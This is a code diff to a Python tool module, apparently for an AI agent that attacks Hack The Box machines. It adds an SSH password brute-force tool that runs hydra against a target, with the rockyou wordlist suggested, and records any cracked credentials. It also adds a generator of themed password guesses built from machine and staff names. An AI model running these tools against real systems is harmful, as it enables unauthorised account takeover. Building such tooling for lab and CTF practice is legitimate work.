@@ -1,9 +1,10 @@
-"""MCP tools — credential operations (defaults, spray, hash recommend/crack/status, audit)."""
+"""MCP tools — credential operations (defaults, spray, bruteforce, hash recommend/crack/status, audit)."""
 
 from __future__ import annotations
 
 import asyncio
 import os
+import re
 import shlex
 from datetime import datetime, timezone
 from pathlib import Path
@@ -133,6 +134,134 @@ async def creds_password_spray(
             pass
 
     return {"target": target, "protocol": protocol, "password": password, "success_count": len(successes), "successes": successes, "rc": res["rc"]}
+
+
+# ── creds_ssh_bruteforce ─────────────────────────────────────────────────────
+
+
+@registry.tool(
+    name="creds_ssh_bruteforce",
+    description=(
+        "SSH bruteforce via hydra: try one or more users against a wordlist. "
+        "For Easy HTB machines, run creds_themed_wordlist_gen first to build a targeted list, "
+        "then call this. For deeper coverage, pass /usr/share/wordlists/rockyou.txt. "
+        "Returns hits immediately — does not wait for full wordlist exhaustion."
+    ),
+    category="creds",
+)
+async def creds_ssh_bruteforce(
+    target: str,
+    users: list[str],
+    wordlist: str,
+    threads: int = 4,
+    timeout: int = 300,
+    machine: str | None = None,
+) -> dict[str, Any]:
+    users_payload = "\n".join(users)
+    cmd = (
+        f"set -e; uf=$(mktemp); printf {shlex.quote(users_payload)} > $uf; "
+        f"timeout {max(30, timeout - 10)}s "
+        f"hydra -L $uf -P {shlex.quote(wordlist)} ssh://{shlex.quote(target)} "
+        f"-t {threads} -q 2>&1; rm -f $uf"
+    )
+    res = await _run_kali(cmd, timeout=float(timeout + 30))
+
+    hits: list[dict[str, str]] = []
+    for line in res["stdout"].splitlines():
+        if "[ssh]" in line and "login:" in line and "password:" in line:
+            m = re.search(r"login:\s*(\S+)\s+password:\s*(.+)$", line.strip())
+            if m:
+                hits.append({"user": m.group(1), "password": m.group(2).strip()})
+
+    try:
+        from kestrel.mcp.tools.narrate import narrate_emit
+        await narrate_emit(stream="💡", text=f"ssh_bruteforce {target}: {len(hits)} hits", machine=machine)
+    except Exception:
+        pass
+
+    if machine and hits:
+        try:
+            ctx = mcp_context.get_context()
+            m_state = ctx.state_store.get_machine(machine)
+            existing = [c.model_dump(mode="json") for c in (m_state.tried_credentials if m_state else [])]
+            for hit in hits:
+                existing.append({"user": hit["user"], "password": hit["password"], "service": "ssh", "result": "success", "ts": _now_iso()})
+            ctx.state_store.update_machine(machine, {"tried_credentials": existing})
+        except Exception:
+            pass
+
+    return {
+        "target": target,
+        "users": users,
+        "wordlist": wordlist,
+        "threads": threads,
+        "hit_count": len(hits),
+        "hits": hits,
+        "rc": res["rc"],
+        "duration_s": res["duration_s"],
+    }
+
+
+# ── creds_themed_wordlist_gen ─────────────────────────────────────────────────
+
+
+@registry.tool(
+    name="creds_themed_wordlist_gen",
+    description=(
+        "Generate a CTF-themed password wordlist combining: machine name variants, staff first/last names, "
+        "page keywords, and common CTF patterns (Machine2024, machine!, etc.). "
+        "Writes /tmp/kestrel-themed-{machine}.txt on Kali. "
+        "Always call this before creds_ssh_bruteforce on Easy/Medium machines."
+    ),
+    category="creds",
+)
+async def creds_themed_wordlist_gen(
+    machine: str,
+    keywords: list[str] | None = None,
+    staff: list[str] | None = None,
+    output_path: str | None = None,
+) -> dict[str, Any]:
+    words: set[str] = set()
+    base_words: list[str] = [machine] + (keywords or []) + (staff or [])
+
+    for w in base_words:
+        w_lower = w.lower().replace(" ", "").replace("-", "").replace("_", "")
+        w_cap = w_lower.capitalize()
+        words.update([
+            w_lower, w_cap, w.upper(),
+            f"{w_lower}123", f"{w_cap}123",
+            f"{w_lower}2024", f"{w_cap}2024",
+            f"{w_lower}2025", f"{w_cap}2025",
+            f"{w_lower}!", f"{w_cap}!",
+            f"{w_lower}1", f"{w_lower}01",
+            f"{w_lower}@123", f"{w_cap}@2024",
+            f"{w_lower}2024!", f"{w_lower}2025!",
+        ])
+
+    words.update([
+        "password", "Password", "Password123", "password123",
+        "admin", "Admin", "admin123", "Admin123",
+        "letmein", "Letmein123", "123456", "12345678",
+        "welcome", "Welcome", "welcome1", "Welcome1",
+        "changeme", "Changeme", "changeme123",
+        "qwerty", "iloveyou", "dragon", "master",
+    ])
+
+    wordlist_content = "\n".join(sorted(words))
+    out_path = output_path or f"/tmp/kestrel-themed-{machine}.txt"
+    cmd = (
+        f"printf {shlex.quote(wordlist_content)} > {shlex.quote(out_path)} "
+        f"&& wc -l {shlex.quote(out_path)}"
+    )
+    res = await _run_kali(cmd, timeout=10.0)
+
+    return {
+        "machine": machine,
+        "output_path": out_path,
+        "word_count": len(words),
+        "rc": res["rc"],
+        "hint": f"Run: creds_ssh_bruteforce(target=..., users=[...], wordlist='{out_path}')",
+    }
 
 
 # ── creds_hash_recommend ─────────────────────────────────────────────────────
